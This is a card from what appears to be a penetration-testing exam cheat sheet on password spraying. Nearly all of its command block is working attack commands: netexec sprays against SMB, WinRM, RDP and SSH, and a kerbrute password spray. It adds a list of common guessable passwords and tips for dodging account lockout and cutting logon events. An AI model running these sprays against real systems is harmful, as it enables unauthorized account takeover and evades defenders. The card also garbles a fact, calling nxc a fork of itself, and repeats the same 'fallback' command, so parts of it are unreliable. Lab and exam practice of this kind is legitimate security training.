title: Password Spraying
body: One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.
cmd:
# CHECK POLICY FIRST — before any spraying
nxc smb $ip -u user -p 'pass' --pass-pol
nxc smb $ip -u user -p 'pass' --pass-pol   # fallback

# Spray with nxc (netexec) — preferred, CME successor
nxc smb $ip -u users.txt -p 'Password123!' --continue-on-success
nxc smb $ip -u users.txt -p 'Winter2025!' --continue-on-success

# Also spray other services simultaneously
nxc winrm $ip -u users.txt -p 'Password123!'
nxc rdp   $ip -u users.txt -p 'Password123!'
nxc ssh   $ip -u users.txt -p 'Password123!'

# Kerbrute spray — faster, fewer logon events than LDAP
./kerbrute_linux_amd64 passwordspray   -d domain.com --dc $ip   users.txt 'Password123!'

# Common spray passwords:
# Password1!   Welcome1!   Summer2024!
# Winter2025!  Company123! <CompanyName>1!

# ══════════════════════════════════════════════════
# ERROR — STATUS_ACCOUNT_LOCKED_OUT
# ══════════════════════════════════════════════════
# You locked the account by spraying too many passwords at ONE user.
#   → Lockout is temporary — clears on its own (often 15-30 min).
#   → Do NOT revert the box; just wait, and check the lockout policy:
#     nxc smb $ip -u USER -p PASS --pass-pol   (lockout threshold + duration)
# GOLDEN RULE to avoid it:
#   Spray ONE password across MANY users — never many passwords at one user.
#   nxc smb $ip -u users.txt -p 'OnePassword!' --continue-on-success
warn: One spray attempt per lockout window — locking accounts is exam failure. nxc (netexec) is the maintained fork of nxc with identical syntax. Spray SMB, WinRM, and RDP in the same pass.

choices.label: Already have a working credential? Use it first
Spray hit — pivot with these creds (lateral)
Got a cred — lateral setup / triage
